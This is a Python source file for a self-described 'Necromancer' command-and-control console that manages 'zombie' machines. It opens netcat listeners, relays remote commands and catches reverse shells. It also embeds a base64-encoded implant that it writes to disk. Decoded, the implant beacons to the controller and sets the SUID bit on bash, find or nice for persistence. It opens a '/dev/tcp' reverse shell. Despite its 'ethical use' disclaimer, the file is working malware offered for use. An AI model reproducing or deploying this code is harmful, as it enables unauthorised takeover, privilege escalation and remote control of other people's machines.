#!/bin/python3

"""
Program: necro.py
Purpose: The purpose of this script is to execute commands and control any machine infected with the zombie.py
Developer: CyberPanther232
Date-Created: 07-June-2025

DISCLAIMER: FOR ETHICAL AND LEGAL USE ONLY
"""

import socket
import time
import random
from pyfiglet import Figlet
from prompt_toolkit import PromptSession
from prompt_toolkit.styles import Style
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from colorama import init, Back, Fore, Style as CStyle
import os
from datetime import datetime
import threading
import json

NECRO_HOST = "127.0.0.1"
NECRO_PORT = 9000
ZOMBIE_SCRIPT = """IyEvYmluL3B5dGhvbjMKCiIiIgpQcm9ncmFtOiB6b21iaWUucHkKUHVycG9zZTogVGhlIHB1cnBv
c2Ugb2YgdGhpcyBzY3JpcHQgaXMgdG8gZGV2ZWxvcCBhIHByb2dyYW0gdGhhdCB0YWtlcyBvdmVy
IGEgdXNlciBvbiBhIGxpbnV4LWJhc2VkIG1hY2hpbmUgKHBlcnNpc3RlbmNlKQpEZXZlbG9wZXI6
IEN5YmVyUGFudGhlcjIzMgpEYXRlLUNyZWF0ZWQ6IDE2LU1heS0yMDI1CgpESVNDTEFJTUVSOiBG
T1IgRVRISUNBTCBBTkQgTEVHQUwgVVNFIE9OTFkKIiIiCgppbXBvcnQgb3MKaW1wb3J0IHNvY2tl
dAppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCgpORUNST19IT1NUID0gIjEyNy4wLjAuMSIKTkVD
Uk9fUE9SVCA9IDkwMDAKVkVDVE9SUyA9IFsiZmluZCIsImJhc2giLCJuaWNlIl0KCmRlZiBsb2Nh
dGVfdmVjdG9ycygpOgogICAgYmluYXJ5X2xvY2F0aW9ucyA9IHt9CgogICAgcGF0aF9kaXJzID0g
b3MuZW52aXJvblsnUEFUSCddLnNwbGl0KG9zLnBhdGhzZXApCgogICAgZm9yIGJpbmFyeSBpbiBW
RUNUT1JTOgogICAgICAgIGZvdW5kID0gRmFsc2UKICAgICAgICBmb3IgZGlyZWN0b3J5IGluIHBh
dGhfZGlyczoKICAgICAgICAgICAgZnVsbF9wYXRoID0gb3MucGF0aC5qb2luKGRpcmVjdG9yeSwg
YmluYXJ5KQogICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShmdWxsX3BhdGgpIGFuZCBvcy5h
Y2Nlc3MoZnVsbF9wYXRoLCBvcy5YX09LKToKICAgICAgICAgICAgICAgIGJpbmFyeV9sb2NhdGlv
bnNbYmluYXJ5XSA9IGZ1bGxfcGF0aAogICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlCiAgICAg
ICAgICAgICAgICBicmVhawogICAgICAgIGlmIG5vdCBmb3VuZDoKICAgICAgICAgICAgYmluYXJ5
X2xvY2F0aW9uc1tiaW5hcnldID0gTm9uZQogICAgCiAgICByZXR1cm4gYmluYXJ5X2xvY2F0aW9u
cwoKZGVmIGluZmVjdCgpOgogICAgdHJ5OgogICAgICAgIHZlY3Rvcl9sb2NhdGlvbnMgPSBsb2Nh
dGVfdmVjdG9ycygpCiAgICAgICAgdmVjdG9yX3NlbGVjdGlvbiA9IHJhbmRvbS5jaG9pY2UoVkVD
VE9SUykKICAgICAgICBvcy5zeXN0ZW0oZiJjaG1vZCB1K3Mge3ZlY3Rvcl9sb2NhdGlvbnNbdmVj
dG9yX3NlbGVjdGlvbl19IikKICAgICAgICAjIHByaW50KHZlY3Rvcl9sb2NhdGlvbnNbdmVjdG9y
X3NlbGVjdGlvbl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZSkK
CmRlZiBjdXJlKCk6CiAgICB0cnk6CiAgICAgICAgdmVjdG9yX2xvY2F0aW9ucyA9IGxvY2F0ZV92
ZWN0b3JzKCkKICAgICAgICB2ZWN0b3Jfc2VsZWN0aW9uID0gcmFuZG9tLmNob2ljZShWRUNUT1JT
KQogICAgICAgIGZvciBrLCB2IGluIHZlY3Rvcl9sb2NhdGlvbnMuaXRlbXMoKToKICAgICAgICAg
ICAgb3Muc3lzdGVtKGYiY2htb2QgdS1zIHt2fSIpCgogICAgICAgICMgb3Muc3lzdGVtKCJybSBv
cy5wYXRoLmJhc2VuYW1lKF9fZmlsZV9fKSIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAg
ICAgICAgcHJpbnQoZSkKCmRlZiBzaGVsbChwb3J0KToKICAgIG9zLnN5c3RlbShmImJhc2ggLWMg
JyQoL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwL3tORUNST19IT1NUfS97cG9ydH0gMD4mMSkgJici
KQoKZGVmIGNhcnJpZXIoKToKICAgIHBhc3MKCmRlZiBjYWxsYmFjayhzb2NrZXQpOgogICAgdHJ5
OgogICAgICAgIHNvY2tldC5zZW5kKCJicmFpbnMuLi4iLmVuY29kZSgpKQoKICAgICAgICBkYXRh
LCBjb25uID0gc29ja2V0LnJlY3Zmcm9tKDEwMjQpCgogICAgICAgIGRhdGEgPSBkYXRhLmRlY29k
ZSgpCgogICAgICAgIGlmIGRhdGE6CiAgICAgICAgICAgIHJldHVybiBkYXRhCiAgICAgICAgCiAg
ICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICBleGNlcHQgRXhjZXB0aW9u
IGFzIGU6CiAgICAgICAgcHJpbnQoZiJFUlJPUjoge2V9IikKCgoKZGVmIG1haW4oKToKICAgICB3
aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgdGltZS5zbGVlcChyYW5kb20ucmFu
ZGludCgwLCAzMCkpCgogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
VCwgc29ja2V0LlNPQ0tfU1RSRUFNKQoKICAgICAgICAgICAgc29jayA9IHMuY29ubmVjdCgoTkVD
Uk9fSE9TVCwgTkVDUk9fUE9SVCkpCgogICAgICAgICAgICByZWNlaXZlZCA9IGNhbGxiYWNrKHMp
CgogICAgICAgICAgICBpZiByZWNlaXZlZDoKCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAg
ICAgICAgICAgICAgcmVjZWl2ZWQgPSByZWNlaXZlZC5zdHJpcCgpLnNwbGl0KCcgJykKICAgICAg
ICAgICAgICAgICAgICBjb21tYW5kLCBhcmcgPSByZWNlaXZlZFswXSwgcmVjZWl2ZWRbMV0KICAg
ICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgICAgICBj
b21tYW5kID0gcmVjZWl2ZWRbMF0KICAgICAgICAgICAgICAgICAgICBhcmcgPSBGYWxzZQoKICAg
ICAgICAgICAgICAgIGlmIGNvbW1hbmQgPT0gImtpbGwiOgogICAgICAgICAgICAgICAgICAgIGV4
aXQoKQoKICAgICAgICAgICAgICAgIGVsaWYgY29tbWFuZCA9PSAic2hlbGwiOgogICAgICAgICAg
ICAgICAgICAgIGlmIGFyZyBhbmQgYXJnICE9IDkwMDEgYW5kIGFyZyA+PSAxMDI0IGFuZCBhcmcg
PCA2NTUzNjoKICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGwoYXJnKQogICAgICAgICAgICAg
ICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHNoZWxsKDkwMDEpCgogICAgICAg
ICAgICAgICAgZWxpZiBjb21tYW5kID09ICJpbmZlY3QiOgogICAgICAgICAgICAgICAgICAgIGlu
ZmVjdCgpCgogICAgICAgICAgICAgICAgZWxpZiBjb21tYW5kID09ICJjdXJlIjoKICAgICAgICAg
ICAgICAgICAgICBjdXJlKCkKCiAgICAgICAgICAgIHMuY2xvc2UoKQogICAgICAgIGV4Y2VwdCBF
eGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcGFzcwoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9f
IjoKICAgIG1haW4oKQ=="""

class Zombie():

    def __init__(self, address, port, device_id):

        self.address = address
        self.port = port
        self.id = device_id

    def received(self):
        pass

    def callback(self):
        pass

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_help():
    print(Fore.CYAN + CStyle.BRIGHT + """
Available Commands:
  echo [text]        - Repeats what you type
  help               - Shows this help message
  clear              - Clears the screen
  zombie             - Generates a zombi3.py script to infect other machines
  devs/devices       - Prints the current list of devices infected
  port               - Sets the port for the listener on the machine
  add [port]         - Adds a zombie (infected device) to the list of infected devices
  kill               - Kills a zombie (removes them from the infected devices list)
  cure               - Removes all traces of infection from an infected device
  brick              - Bricks a device (VERY DANGEROUS FUNCTION)
  shell [device-id]  - Attempts to create a shell of a zombie (infected device) based off the id
  exit               - Leaves the shell

  NOTE: This program also allows the use of standard TTY terminal commands and tools

""")

def initialize_zombie_file():
    """Ensure the zombies.json file exists and is properly initialized."""
    if not os.path.exists("zombies.json"):
        with open("zombies.json", "w") as f:
            json.dump({'zombies': {}}, f, indent=4)

def listener_thread(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', port))
    s.listen(1)

    while True:
        conn, addr = s.accept()

        response = conn.recv(1024)
        
        if response:
            now = datetime.now()
            timestamp = now.strftime('%d-%m-%y %H:%M:%S')
            address, remote_port = addr
            device_id = now.strftime('%Y%m%d%H%M%S%f')  # Use a timestamp-based ID

            conn.send('ADDED'.encode())

            # Load existing data
            try:
                with open("zombies.json", "r") as f:
                    data = json.load(f)
            except (FileNotFoundError, json.JSONDecodeError):
                data = {'zombies': {}}

            # Append new zombie
            data['zombies'][device_id] = {
                'address': address,
                'port' : port,
                'timestamp': timestamp
            }

            # Save it back
            with open("zombies.json", 'w') as f:
                json.dump(data, f, indent=4)
            
            break

        conn.close()

def listener(port):
    try:
        port = int(port)
        if port <= 0 or port > 65535:
            raise ValueError

        print(f"\n☠️  ☠️  ☠️  Starting Listener 0.0.0.0:{port} ☠️  ☠️  ☠️\n")

        t = threading.Thread(target=listener_thread, args=(int(port),), daemon=True)
        t.start()
    except Exception as e:
        print(f"ERROR {e}")
        print("Make sure you enter a positive integer value")
        return


def main():

    initialize_zombie_file()

    # Clear terminal screen on start
    os.system('cls' if os.name == 'nt' else 'clear')

    # Initialize colorama
    init(autoreset=True)

    # Create custom figlet font
    fig = Figlet(font='slant')  # You can try 'slant', 'ghost', 'big', 'banner3-D'

    # Generate banner text
    banner = fig.renderText("The Necromancer")

    # Print with color and skulls
    print(Fore.GREEN + CStyle.BRIGHT + banner)
    print(Fore.GREEN + CStyle.BRIGHT + '☠️   v1.0  ☠️'.center(70))
    print()

    history = InMemoryHistory()

    style = Style.from_dict({
    'prompt': 'fg:#00ff90 bold',
    })

    session = PromptSession(history=InMemoryHistory())


    while True:
        try:
            command_line = session.prompt(
            HTML(f'<prompt>NECRO {datetime.now().strftime('%d-%m-%y %H:%M:%S')} $&gt;&gt; </prompt>'),
            style=style
        )
        except (EOFError, KeyboardInterrupt):
            print(Fore.RED + "\n☠️  Farewell, mortal.")
            break

        if not command_line.strip():
            continue  # Skip empty input

        # Split command and arguments safely
        parts = command_line.strip().split(' ', 1)
        command = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ''

        if command == "echo":
            print(arg)

        elif command == "exit":
            print("☠️  Farewell, mortal.")
            break

        elif command == "devs" or command == "devices":
            try:
                with open("zombies.json", "r") as f:
                    data = json.load(f)

                zombies = data.get('zombies', {})

                if not zombies:
                    print("No zombies found.")
                    return

                print("\n🧟 List of Zombies:\n")
                for device_id, info in zombies.items():
                    print(f"ID: {device_id} | Address: {info['address']} | Listener Port: {info['port']}")

                print()
            except (FileNotFoundError, json.JSONDecodeError):
                print("No valid zombies.json file found.")

        elif command == "zombie" or command == "zomb":
            os.system(f'echo "{ZOMBIE_SCRIPT}" | base64 -d > zombi3.py')
            print("\nRAISING THE DEAD!!!!")
            print("zombi3.py script created in the current working directory!\n")
        
        elif command == "cl" or command == "clear" or command == "cls":
            clear()

        elif command == "help":
            show_help()

        elif command == "add":
            if arg and arg != '':
                listener(arg)
            else:
                print(Fore.RED + f"No argument specified...")

        elif command == "cmd" or command == "command":
            try:
                if arg:

                    with open("zombies.json", "r") as f:
                        data = json.load(f)
                    zombie = data['zombies'][arg]
                    
                    cmd = input("Enter remote command: ").lower()

                    if cmd:

                        if cmd == "shell":
                            rev_port = int(input("Enter Reverse Shell Port: "))
                            os.system(f'echo "{cmd}" | nc -l -p {int(data['zombies'][arg]['port'])} &')
                            os.system(f"nc -lvnp {rev_port}")

                        else:
                            os.system(f'echo "{cmd}" | nc -l -p {int(data['zombies'][arg]['port'])}')
                            print()

                else:
                    print(Fore.RED + f"\nNo argument specified...")
                    print(Fore.RED + f"Example: cmd [device_id]\n")
            except Exception as e:
                print(Fore.RED + f"ERROR: {e}")

        else:
            try:
                value = os.system(command + ' ' + arg)
                if value == 32512:
                    print(Fore.RED + f"Unknown command: {command}")
            except:
                print(Fore.RED + f"Unknown command: {command}")
            

if __name__ == "__main__":
    main()